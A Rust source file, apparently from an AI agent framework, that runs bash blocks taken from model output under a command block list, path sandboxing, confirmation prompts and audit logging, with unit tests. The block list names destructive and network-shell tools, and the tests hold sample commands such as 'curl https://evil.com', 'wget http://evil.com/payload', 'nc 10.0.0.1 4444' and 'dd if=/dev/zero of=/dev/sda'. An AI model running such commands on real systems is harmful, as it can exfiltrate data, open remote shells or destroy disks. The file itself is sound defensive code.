use std::path::PathBuf;
use std::time::{Duration, Instant};

use tokio::process::Command;

use crate::audit::{AuditEntry, AuditLogger, AuditResult};
use crate::config::ShellConfig;
use crate::executor::{ToolError, ToolEvent, ToolEventTx, ToolExecutor, ToolOutput};
use crate::permissions::{PermissionAction, PermissionPolicy};

const DEFAULT_BLOCKED: &[&str] = &[
    "rm -rf /", "sudo", "mkfs", "dd if=", "curl", "wget", "nc ", "ncat", "netcat", "shutdown",
    "reboot", "halt",
];

const NETWORK_COMMANDS: &[&str] = &["curl", "wget", "nc ", "ncat", "netcat"];

/// Bash block extraction and execution via `tokio::process::Command`.
#[derive(Debug)]
pub struct ShellExecutor {
    timeout: Duration,
    blocked_commands: Vec<String>,
    allowed_paths: Vec<PathBuf>,
    confirm_patterns: Vec<String>,
    audit_logger: Option<AuditLogger>,
    tool_event_tx: Option<ToolEventTx>,
    permission_policy: Option<PermissionPolicy>,
}

impl ShellExecutor {
    #[must_use]
    pub fn new(config: &ShellConfig) -> Self {
        let allowed: Vec<String> = config
            .allowed_commands
            .iter()
            .map(|s| s.to_lowercase())
            .collect();

        let mut blocked: Vec<String> = DEFAULT_BLOCKED
            .iter()
            .filter(|s| !allowed.contains(&s.to_lowercase()))
            .map(|s| (*s).to_owned())
            .collect();
        blocked.extend(config.blocked_commands.iter().map(|s| s.to_lowercase()));

        if !config.allow_network {
            for cmd in NETWORK_COMMANDS {
                let lower = cmd.to_lowercase();
                if !blocked.contains(&lower) {
                    blocked.push(lower);
                }
            }
        }

        blocked.sort();
        blocked.dedup();

        let allowed_paths = if config.allowed_paths.is_empty() {
            vec![std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."))]
        } else {
            config.allowed_paths.iter().map(PathBuf::from).collect()
        };

        Self {
            timeout: Duration::from_secs(config.timeout),
            blocked_commands: blocked,
            allowed_paths,
            confirm_patterns: config.confirm_patterns.clone(),
            audit_logger: None,
            tool_event_tx: None,
            permission_policy: None,
        }
    }

    #[must_use]
    pub fn with_audit(mut self, logger: AuditLogger) -> Self {
        self.audit_logger = Some(logger);
        self
    }

    #[must_use]
    pub fn with_tool_event_tx(mut self, tx: ToolEventTx) -> Self {
        self.tool_event_tx = Some(tx);
        self
    }

    #[must_use]
    pub fn with_permissions(mut self, policy: PermissionPolicy) -> Self {
        self.permission_policy = Some(policy);
        self
    }

    /// Execute a bash block bypassing the confirmation check (called after user confirms).
    ///
    /// # Errors
    ///
    /// Returns `ToolError` on blocked commands, sandbox violations, or execution failures.
    pub async fn execute_confirmed(&self, response: &str) -> Result<Option<ToolOutput>, ToolError> {
        self.execute_inner(response, true).await
    }

    async fn execute_inner(
        &self,
        response: &str,
        skip_confirm: bool,
    ) -> Result<Option<ToolOutput>, ToolError> {
        let blocks = extract_bash_blocks(response);
        if blocks.is_empty() {
            return Ok(None);
        }

        let mut outputs = Vec::with_capacity(blocks.len());
        #[allow(clippy::cast_possible_truncation)]
        let blocks_executed = blocks.len() as u32;

        for block in &blocks {
            if let Some(ref policy) = self.permission_policy {
                match policy.check("bash", block) {
                    PermissionAction::Deny => {
                        self.log_audit(
                            block,
                            AuditResult::Blocked {
                                reason: "denied by permission policy".to_owned(),
                            },
                            0,
                        )
                        .await;
                        return Err(ToolError::Blocked {
                            command: (*block).to_owned(),
                        });
                    }
                    PermissionAction::Ask if !skip_confirm => {
                        return Err(ToolError::ConfirmationRequired {
                            command: (*block).to_owned(),
                        });
                    }
                    _ => {}
                }
            } else {
                if let Some(blocked) = self.find_blocked_command(block) {
                    self.log_audit(
                        block,
                        AuditResult::Blocked {
                            reason: format!("blocked command: {blocked}"),
                        },
                        0,
                    )
                    .await;
                    return Err(ToolError::Blocked {
                        command: blocked.to_owned(),
                    });
                }

                if !skip_confirm && let Some(pattern) = self.find_confirm_command(block) {
                    return Err(ToolError::ConfirmationRequired {
                        command: pattern.to_owned(),
                    });
                }
            }

            self.validate_sandbox(block)?;

            if let Some(ref tx) = self.tool_event_tx {
                let _ = tx.send(ToolEvent::Started {
                    tool_name: "bash".to_owned(),
                    command: (*block).to_owned(),
                });
            }

            let start = Instant::now();
            let out = execute_bash(block, self.timeout, self.tool_event_tx.as_ref()).await;
            #[allow(clippy::cast_possible_truncation)]
            let duration_ms = start.elapsed().as_millis() as u64;

            let result = if out.contains("[error]") {
                AuditResult::Error {
                    message: out.clone(),
                }
            } else if out.contains("timed out") {
                AuditResult::Timeout
            } else {
                AuditResult::Success
            };
            self.log_audit(block, result, duration_ms).await;

            if let Some(ref tx) = self.tool_event_tx {
                let _ = tx.send(ToolEvent::Completed {
                    tool_name: "bash".to_owned(),
                    command: (*block).to_owned(),
                    output: out.clone(),
                    success: !out.contains("[error]"),
                });
            }

            outputs.push(format!("$ {block}\n{out}"));
        }

        Ok(Some(ToolOutput {
            tool_name: "bash".to_owned(),
            summary: outputs.join("\n\n"),
            blocks_executed,
        }))
    }

    fn validate_sandbox(&self, code: &str) -> Result<(), ToolError> {
        for token in extract_absolute_paths(code) {
            let path = PathBuf::from(token);
            let canonical = path.canonicalize().unwrap_or(path);
            if !self
                .allowed_paths
                .iter()
                .any(|allowed| canonical.starts_with(allowed))
            {
                return Err(ToolError::SandboxViolation {
                    path: canonical.display().to_string(),
                });
            }
        }
        Ok(())
    }

    fn find_blocked_command(&self, code: &str) -> Option<&str> {
        let normalized = code.to_lowercase();
        for blocked in &self.blocked_commands {
            if normalized.contains(blocked.as_str()) {
                return Some(blocked.as_str());
            }
        }
        None
    }

    fn find_confirm_command(&self, code: &str) -> Option<&str> {
        let normalized = code.to_lowercase();
        for pattern in &self.confirm_patterns {
            if normalized.contains(pattern.as_str()) {
                return Some(pattern.as_str());
            }
        }
        None
    }

    async fn log_audit(&self, command: &str, result: AuditResult, duration_ms: u64) {
        if let Some(ref logger) = self.audit_logger {
            let entry = AuditEntry {
                timestamp: chrono_now(),
                tool: "shell".into(),
                command: command.into(),
                result,
                duration_ms,
            };
            logger.log(&entry).await;
        }
    }
}

impl ToolExecutor for ShellExecutor {
    async fn execute(&self, response: &str) -> Result<Option<ToolOutput>, ToolError> {
        self.execute_inner(response, false).await
    }
}

fn extract_absolute_paths(code: &str) -> Vec<&str> {
    code.split_whitespace()
        .filter(|token| token.starts_with('/'))
        .map(|token| token.trim_end_matches([';', '&', '|']))
        .filter(|t| !t.is_empty())
        .collect()
}

fn extract_bash_blocks(text: &str) -> Vec<&str> {
    crate::executor::extract_fenced_blocks(text, "bash")
}

fn chrono_now() -> String {
    use std::time::{SystemTime, UNIX_EPOCH};
    let secs = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();
    format!("{secs}")
}

async fn execute_bash(code: &str, timeout: Duration, event_tx: Option<&ToolEventTx>) -> String {
    use std::process::Stdio;
    use tokio::io::{AsyncBufReadExt, BufReader};

    let timeout_secs = timeout.as_secs();

    let child_result = Command::new("bash")
        .arg("-c")
        .arg(code)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn();

    let mut child = match child_result {
        Ok(c) => c,
        Err(e) => return format!("[error] {e}"),
    };

    let stdout = child.stdout.take().expect("stdout piped");
    let stderr = child.stderr.take().expect("stderr piped");

    let (line_tx, mut line_rx) = tokio::sync::mpsc::channel::<String>(64);

    let stdout_tx = line_tx.clone();
    tokio::spawn(async move {
        let mut reader = BufReader::new(stdout);
        let mut buf = String::new();
        while reader.read_line(&mut buf).await.unwrap_or(0) > 0 {
            let _ = stdout_tx.send(buf.clone()).await;
            buf.clear();
        }
    });

    tokio::spawn(async move {
        let mut reader = BufReader::new(stderr);
        let mut buf = String::new();
        while reader.read_line(&mut buf).await.unwrap_or(0) > 0 {
            let _ = line_tx.send(format!("[stderr] {buf}")).await;
            buf.clear();
        }
    });

    let mut combined = String::new();
    let deadline = tokio::time::Instant::now() + timeout;

    loop {
        tokio::select! {
            line = line_rx.recv() => {
                match line {
                    Some(chunk) => {
                        if let Some(tx) = event_tx {
                            let _ = tx.send(ToolEvent::OutputChunk {
                                tool_name: "bash".to_owned(),
                                command: code.to_owned(),
                                chunk: chunk.clone(),
                            });
                        }
                        combined.push_str(&chunk);
                    }
                    None => break,
                }
            }
            () = tokio::time::sleep_until(deadline) => {
                let _ = child.kill().await;
                return format!("[error] command timed out after {timeout_secs}s");
            }
        }
    }

    let _ = child.wait().await;

    if combined.is_empty() {
        "(no output)".to_string()
    } else {
        combined
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn default_config() -> ShellConfig {
        ShellConfig {
            timeout: 30,
            blocked_commands: Vec::new(),
            allowed_commands: Vec::new(),
            allowed_paths: Vec::new(),
            allow_network: true,
            confirm_patterns: Vec::new(),
        }
    }

    fn sandbox_config(allowed_paths: Vec<String>) -> ShellConfig {
        ShellConfig {
            allowed_paths,
            ..default_config()
        }
    }

    #[test]
    fn extract_single_bash_block() {
        let text = "Here is code:\n```bash\necho hello\n```\nDone.";
        let blocks = extract_bash_blocks(text);
        assert_eq!(blocks, vec!["echo hello"]);
    }

    #[test]
    fn extract_multiple_bash_blocks() {
        let text = "```bash\nls\n```\ntext\n```bash\npwd\n```";
        let blocks = extract_bash_blocks(text);
        assert_eq!(blocks, vec!["ls", "pwd"]);
    }

    #[test]
    fn ignore_non_bash_blocks() {
        let text = "```python\nprint('hi')\n```\n```bash\necho hi\n```";
        let blocks = extract_bash_blocks(text);
        assert_eq!(blocks, vec!["echo hi"]);
    }

    #[test]
    fn no_blocks_returns_none() {
        let text = "Just plain text, no code blocks.";
        let blocks = extract_bash_blocks(text);
        assert!(blocks.is_empty());
    }

    #[test]
    fn unclosed_block_ignored() {
        let text = "```bash\necho hello";
        let blocks = extract_bash_blocks(text);
        assert!(blocks.is_empty());
    }

    #[tokio::test]
    #[cfg(not(target_os = "windows"))]
    async fn execute_simple_command() {
        let result = execute_bash("echo hello", Duration::from_secs(30), None).await;
        assert!(result.contains("hello"));
    }

    #[tokio::test]
    #[cfg(not(target_os = "windows"))]
    async fn execute_stderr_output() {
        let result = execute_bash("echo err >&2", Duration::from_secs(30), None).await;
        assert!(result.contains("[stderr]"));
        assert!(result.contains("err"));
    }

    #[tokio::test]
    #[cfg(not(target_os = "windows"))]
    async fn execute_stdout_and_stderr_combined() {
        let result = execute_bash("echo out && echo err >&2", Duration::from_secs(30), None).await;
        assert!(result.contains("out"));
        assert!(result.contains("[stderr]"));
        assert!(result.contains("err"));
        assert!(result.contains('\n'));
    }

    #[tokio::test]
    #[cfg(not(target_os = "windows"))]
    async fn execute_empty_output() {
        let result = execute_bash("true", Duration::from_secs(30), None).await;
        assert_eq!(result, "(no output)");
    }

    #[tokio::test]
    async fn blocked_command_rejected() {
        let config = ShellConfig {
            blocked_commands: vec!["rm -rf /".to_owned()],
            ..default_config()
        };
        let executor = ShellExecutor::new(&config);
        let response = "Run:\n```bash\nrm -rf /\n```";
        let result = executor.execute(response).await;
        assert!(matches!(result, Err(ToolError::Blocked { .. })));
    }

    #[tokio::test]
    #[cfg(not(target_os = "windows"))]
    async fn timeout_enforced() {
        let config = ShellConfig {
            timeout: 1,
            ..default_config()
        };
        let executor = ShellExecutor::new(&config);
        let response = "Run:\n```bash\nsleep 60\n```";
        let result = executor.execute(response).await;
        assert!(result.is_ok());
        let output = result.unwrap().unwrap();
        assert!(output.summary.contains("timed out"));
    }

    #[tokio::test]
    async fn execute_no_blocks_returns_none() {
        let executor = ShellExecutor::new(&default_config());
        let result = executor.execute("plain text, no blocks").await;
        assert!(result.is_ok());
        assert!(result.unwrap().is_none());
    }

    #[tokio::test]
    async fn execute_multiple_blocks_counted() {
        let executor = ShellExecutor::new(&default_config());
        let response = "```bash\necho one\n```\n```bash\necho two\n```";
        let result = executor.execute(response).await;
        let output = result.unwrap().unwrap();
        assert_eq!(output.blocks_executed, 2);
        assert!(output.summary.contains("one"));
        assert!(output.summary.contains("two"));
    }

    // --- command filtering tests ---

    #[test]
    fn default_blocked_always_active() {
        let executor = ShellExecutor::new(&default_config());
        assert!(executor.find_blocked_command("rm -rf /").is_some());
        assert!(executor.find_blocked_command("sudo apt install").is_some());
        assert!(
            executor
                .find_blocked_command("mkfs.ext4 /dev/sda")
                .is_some()
        );
        assert!(
            executor
                .find_blocked_command("dd if=/dev/zero of=disk")
                .is_some()
        );
    }

    #[test]
    fn user_blocked_additive() {
        let config = ShellConfig {
            blocked_commands: vec!["custom-danger".to_owned()],
            ..default_config()
        };
        let executor = ShellExecutor::new(&config);
        assert!(executor.find_blocked_command("sudo rm").is_some());
        assert!(
            executor
                .find_blocked_command("custom-danger script")
                .is_some()
        );
    }

    #[test]
    fn blocked_prefix_match() {
        let executor = ShellExecutor::new(&default_config());
        assert!(executor.find_blocked_command("rm -rf /home/user").is_some());
    }

    #[test]
    fn blocked_infix_match() {
        let executor = ShellExecutor::new(&default_config());
        assert!(
            executor
                .find_blocked_command("echo hello && sudo rm")
                .is_some()
        );
    }

    #[test]
    fn blocked_case_insensitive() {
        let executor = ShellExecutor::new(&default_config());
        assert!(executor.find_blocked_command("SUDO apt install").is_some());
        assert!(executor.find_blocked_command("Sudo apt install").is_some());
        assert!(executor.find_blocked_command("SuDo apt install").is_some());
        assert!(
            executor
                .find_blocked_command("MKFS.ext4 /dev/sda")
                .is_some()
        );
        assert!(executor.find_blocked_command("DD IF=/dev/zero").is_some());
        assert!(executor.find_blocked_command("RM -RF /").is_some());
    }

    #[test]
    fn safe_command_passes() {
        let executor = ShellExecutor::new(&default_config());
        assert!(executor.find_blocked_command("echo hello").is_none());
        assert!(executor.find_blocked_command("ls -la").is_none());
        assert!(executor.find_blocked_command("cat file.txt").is_none());
        assert!(executor.find_blocked_command("cargo build").is_none());
    }

    #[test]
    fn partial_match_accepted_tradeoff() {
        let executor = ShellExecutor::new(&default_config());
        // "sudoku" contains "sudo" — accepted false positive for MVP
        assert!(executor.find_blocked_command("sudoku").is_some());
    }

    #[test]
    fn multiline_command_blocked() {
        let executor = ShellExecutor::new(&default_config());
        assert!(executor.find_blocked_command("echo ok\nsudo rm").is_some());
    }

    #[test]
    fn dd_pattern_blocks_dd_if() {
        let executor = ShellExecutor::new(&default_config());
        assert!(
            executor
                .find_blocked_command("dd if=/dev/zero of=/dev/sda")
                .is_some()
        );
    }

    #[test]
    fn mkfs_pattern_blocks_variants() {
        let executor = ShellExecutor::new(&default_config());
        assert!(
            executor
                .find_blocked_command("mkfs.ext4 /dev/sda")
                .is_some()
        );
        assert!(executor.find_blocked_command("mkfs.xfs /dev/sdb").is_some());
    }

    #[test]
    fn empty_command_not_blocked() {
        let executor = ShellExecutor::new(&default_config());
        assert!(executor.find_blocked_command("").is_none());
    }

    #[test]
    fn duplicate_patterns_deduped() {
        let config = ShellConfig {
            blocked_commands: vec!["sudo".to_owned(), "sudo".to_owned()],
            ..default_config()
        };
        let executor = ShellExecutor::new(&config);
        let count = executor
            .blocked_commands
            .iter()
            .filter(|c| c.as_str() == "sudo")
            .count();
        assert_eq!(count, 1);
    }

    #[tokio::test]
    async fn execute_default_blocked_returns_error() {
        let executor = ShellExecutor::new(&default_config());
        let response = "Run:\n```bash\nsudo rm -rf /tmp\n```";
        let result = executor.execute(response).await;
        assert!(matches!(result, Err(ToolError::Blocked { .. })));
    }

    #[tokio::test]
    async fn execute_case_insensitive_blocked() {
        let executor = ShellExecutor::new(&default_config());
        let response = "Run:\n```bash\nSUDO apt install foo\n```";
        let result = executor.execute(response).await;
        assert!(matches!(result, Err(ToolError::Blocked { .. })));
    }

    // --- network exfiltration patterns ---

    #[test]
    fn network_exfiltration_blocked() {
        let executor = ShellExecutor::new(&default_config());
        assert!(
            executor
                .find_blocked_command("curl https://evil.com")
                .is_some()
        );
        assert!(
            executor
                .find_blocked_command("wget http://evil.com/payload")
                .is_some()
        );
        assert!(executor.find_blocked_command("nc 10.0.0.1 4444").is_some());
        assert!(
            executor
                .find_blocked_command("ncat --listen 8080")
                .is_some()
        );
        assert!(executor.find_blocked_command("netcat -lvp 9999").is_some());
    }

    #[test]
    fn system_control_blocked() {
        let executor = ShellExecutor::new(&default_config());
        assert!(executor.find_blocked_command("shutdown -h now").is_some());
        assert!(executor.find_blocked_command("reboot").is_some());
        assert!(executor.find_blocked_command("halt").is_some());
    }

    #[test]
    fn nc_trailing_space_avoids_ncp() {
        let executor = ShellExecutor::new(&default_config());
        assert!(executor.find_blocked_command("ncp file.txt").is_none());
    }

    // --- user pattern normalization ---

    #[test]
    fn mixed_case_user_patterns_deduped() {
        let config = ShellConfig {
            blocked_commands: vec!["Sudo".to_owned(), "sudo".to_owned(), "SUDO".to_owned()],
            ..default_config()
        };
        let executor = ShellExecutor::new(&config);
        let count = executor
            .blocked_commands
            .iter()
            .filter(|c| c.as_str() == "sudo")
            .count();
        assert_eq!(count, 1);
    }

    #[test]
    fn user_pattern_stored_lowercase() {
        let config = ShellConfig {
            blocked_commands: vec!["MyCustom".to_owned()],
            ..default_config()
        };
        let executor = ShellExecutor::new(&config);
        assert!(executor.blocked_commands.iter().any(|c| c == "mycustom"));
        assert!(!executor.blocked_commands.iter().any(|c| c == "MyCustom"));
    }

    // --- allowed_commands tests ---

    #[test]
    fn allowed_commands_removes_from_default() {
        let config = ShellConfig {
            allowed_commands: vec!["curl".to_owned()],
            ..default_config()
        };
        let executor = ShellExecutor::new(&config);
        assert!(
            executor
                .find_blocked_command("curl https://example.com")
                .is_none()
        );
        assert!(executor.find_blocked_command("sudo rm").is_some());
    }

    #[test]
    fn allowed_commands_case_insensitive() {
        let config = ShellConfig {
            allowed_commands: vec!["CURL".to_owned()],
            ..default_config()
        };
        let executor = ShellExecutor::new(&config);
        assert!(
            executor
                .find_blocked_command("curl https://example.com")
                .is_none()
        );
    }

    #[test]
    fn allowed_does_not_override_explicit_block() {
        let config = ShellConfig {
            blocked_commands: vec!["curl".to_owned()],
            allowed_commands: vec!["curl".to_owned()],
            ..default_config()
        };
        let executor = ShellExecutor::new(&config);
        assert!(
            executor
                .find_blocked_command("curl https://example.com")
                .is_some()
        );
    }

    #[test]
    fn allowed_unknown_command_ignored() {
        let config = ShellConfig {
            allowed_commands: vec!["nonexistent-cmd".to_owned()],
            ..default_config()
        };
        let executor = ShellExecutor::new(&config);
        assert!(executor.find_blocked_command("sudo rm").is_some());
        assert!(
            executor
                .find_blocked_command("curl https://example.com")
                .is_some()
        );
    }

    #[test]
    fn empty_allowed_commands_changes_nothing() {
        let executor = ShellExecutor::new(&default_config());
        assert!(
            executor
                .find_blocked_command("curl https://example.com")
                .is_some()
        );
        assert!(executor.find_blocked_command("sudo rm").is_some());
        assert!(
            executor
                .find_blocked_command("wget http://evil.com")
                .is_some()
        );
    }

    // --- Phase 1: sandbox tests ---

    #[test]
    fn extract_absolute_paths_from_code() {
        let paths = extract_absolute_paths("cat /etc/passwd && ls /var/log");
        assert_eq!(paths, vec!["/etc/passwd", "/var/log"]);
    }

    #[test]
    fn extract_absolute_paths_handles_trailing_chars() {
        let paths = extract_absolute_paths("cat /etc/passwd; echo /var/log|");
        assert_eq!(paths, vec!["/etc/passwd", "/var/log"]);
    }

    #[test]
    fn extract_absolute_paths_ignores_relative() {
        let paths = extract_absolute_paths("cat ./file.txt ../other");
        assert!(paths.is_empty());
    }

    #[test]
    fn sandbox_allows_cwd_by_default() {
        let executor = ShellExecutor::new(&default_config());
        let cwd = std::env::current_dir().unwrap();
        let cwd_path = cwd.display().to_string();
        let code = format!("cat {cwd_path}/file.txt");
        assert!(executor.validate_sandbox(&code).is_ok());
    }

    #[test]
    fn sandbox_rejects_path_outside_allowed() {
        let config = sandbox_config(vec!["/tmp/test-sandbox".into()]);
        let executor = ShellExecutor::new(&config);
        let result = executor.validate_sandbox("cat /etc/passwd");
        assert!(matches!(result, Err(ToolError::SandboxViolation { .. })));
    }

    #[test]
    fn sandbox_no_absolute_paths_passes() {
        let config = sandbox_config(vec!["/tmp".into()]);
        let executor = ShellExecutor::new(&config);
        assert!(executor.validate_sandbox("echo hello").is_ok());
    }

    // --- Phase 1: allow_network tests ---

    #[test]
    fn allow_network_false_blocks_network_commands() {
        let config = ShellConfig {
            allow_network: false,
            ..default_config()
        };
        let executor = ShellExecutor::new(&config);
        assert!(
            executor
                .find_blocked_command("curl https://example.com")
                .is_some()
        );
        assert!(
            executor
                .find_blocked_command("wget http://example.com")
                .is_some()
        );
        assert!(executor.find_blocked_command("nc 10.0.0.1 4444").is_some());
    }

    #[test]
    fn allow_network_true_keeps_default_behavior() {
        let config = ShellConfig {
            allow_network: true,
            ..default_config()
        };
        let executor = ShellExecutor::new(&config);
        // Network commands are still blocked by DEFAULT_BLOCKED
        assert!(
            executor
                .find_blocked_command("curl https://example.com")
                .is_some()
        );
    }

    // --- Phase 2a: confirmation tests ---

    #[test]
    fn find_confirm_command_matches_pattern() {
        let config = ShellConfig {
            confirm_patterns: vec!["rm ".into(), "git push -f".into()],
            ..default_config()
        };
        let executor = ShellExecutor::new(&config);
        assert_eq!(
            executor.find_confirm_command("rm /tmp/file.txt"),
            Some("rm ")
        );
        assert_eq!(
            executor.find_confirm_command("git push -f origin main"),
            Some("git push -f")
        );
    }

    #[test]
    fn find_confirm_command_case_insensitive() {
        let config = ShellConfig {
            confirm_patterns: vec!["drop table".into()],
            ..default_config()
        };
        let executor = ShellExecutor::new(&config);
        assert!(executor.find_confirm_command("DROP TABLE users").is_some());
    }

    #[test]
    fn find_confirm_command_no_match() {
        let config = ShellConfig {
            confirm_patterns: vec!["rm ".into()],
            ..default_config()
        };
        let executor = ShellExecutor::new(&config);
        assert!(executor.find_confirm_command("echo hello").is_none());
    }

    #[tokio::test]
    async fn confirmation_required_returned() {
        let config = ShellConfig {
            confirm_patterns: vec!["rm ".into()],
            ..default_config()
        };
        let executor = ShellExecutor::new(&config);
        let response = "```bash\nrm file.txt\n```";
        let result = executor.execute(response).await;
        assert!(matches!(
            result,
            Err(ToolError::ConfirmationRequired { .. })
        ));
    }

    #[tokio::test]
    async fn execute_confirmed_skips_confirmation() {
        let config = ShellConfig {
            confirm_patterns: vec!["echo".into()],
            ..default_config()
        };
        let executor = ShellExecutor::new(&config);
        let response = "```bash\necho confirmed\n```";
        let result = executor.execute_confirmed(response).await;
        assert!(result.is_ok());
        let output = result.unwrap().unwrap();
        assert!(output.summary.contains("confirmed"));
    }

    // --- default confirm patterns test ---

    #[test]
    fn default_confirm_patterns_loaded() {
        let config = ShellConfig::default();
        assert!(!config.confirm_patterns.is_empty());
        assert!(config.confirm_patterns.contains(&"rm ".to_owned()));
        assert!(config.confirm_patterns.contains(&"git push -f".to_owned()));
    }

    #[tokio::test]
    async fn with_audit_attaches_logger() {
        use crate::audit::AuditLogger;
        use crate::config::AuditConfig;
        let config = default_config();
        let executor = ShellExecutor::new(&config);
        let audit_config = AuditConfig {
            enabled: true,
            destination: "stdout".into(),
        };
        let logger = AuditLogger::from_config(&audit_config).await.unwrap();
        let executor = executor.with_audit(logger);
        assert!(executor.audit_logger.is_some());
    }

    #[test]
    fn chrono_now_returns_valid_timestamp() {
        let ts = chrono_now();
        assert!(!ts.is_empty());
        let parsed: u64 = ts.parse().unwrap();
        assert!(parsed > 0);
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn execute_bash_error_handling() {
        let result = execute_bash("false", Duration::from_secs(5), None).await;
        assert_eq!(result, "(no output)");
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn execute_bash_command_not_found() {
        let result = execute_bash("nonexistent-command-xyz", Duration::from_secs(5), None).await;
        assert!(result.contains("[stderr]") || result.contains("[error]"));
    }

    #[test]
    fn extract_absolute_paths_empty() {
        assert!(extract_absolute_paths("").is_empty());
    }

    #[tokio::test]
    async fn policy_deny_blocks_command() {
        let policy = PermissionPolicy::from_legacy(&["forbidden".to_owned()], &[]);
        let executor = ShellExecutor::new(&default_config()).with_permissions(policy);
        let response = "```bash\nforbidden command\n```";
        let result = executor.execute(response).await;
        assert!(matches!(result, Err(ToolError::Blocked { .. })));
    }

    #[tokio::test]
    async fn policy_ask_requires_confirmation() {
        let policy = PermissionPolicy::from_legacy(&[], &["risky".to_owned()]);
        let executor = ShellExecutor::new(&default_config()).with_permissions(policy);
        let response = "```bash\nrisky operation\n```";
        let result = executor.execute(response).await;
        assert!(matches!(
            result,
            Err(ToolError::ConfirmationRequired { .. })
        ));
    }

    #[tokio::test]
    async fn policy_allow_skips_checks() {
        use crate::permissions::PermissionRule;
        use std::collections::HashMap;
        let mut rules = HashMap::new();
        rules.insert(
            "bash".to_owned(),
            vec![PermissionRule {
                pattern: "*".to_owned(),
                action: PermissionAction::Allow,
            }],
        );
        let policy = PermissionPolicy::new(rules);
        let executor = ShellExecutor::new(&default_config()).with_permissions(policy);
        let response = "```bash\necho hello\n```";
        let result = executor.execute(response).await;
        assert!(result.is_ok());
    }

    #[tokio::test]
    async fn blocked_command_logged_to_audit() {
        use crate::audit::AuditLogger;
        use crate::config::AuditConfig;
        let config = ShellConfig {
            blocked_commands: vec!["dangerous".to_owned()],
            ..default_config()
        };
        let audit_config = AuditConfig {
            enabled: true,
            destination: "stdout".into(),
        };
        let logger = AuditLogger::from_config(&audit_config).await.unwrap();
        let executor = ShellExecutor::new(&config).with_audit(logger);
        let response = "```bash\ndangerous command\n```";
        let result = executor.execute(response).await;
        assert!(matches!(result, Err(ToolError::Blocked { .. })));
    }
}
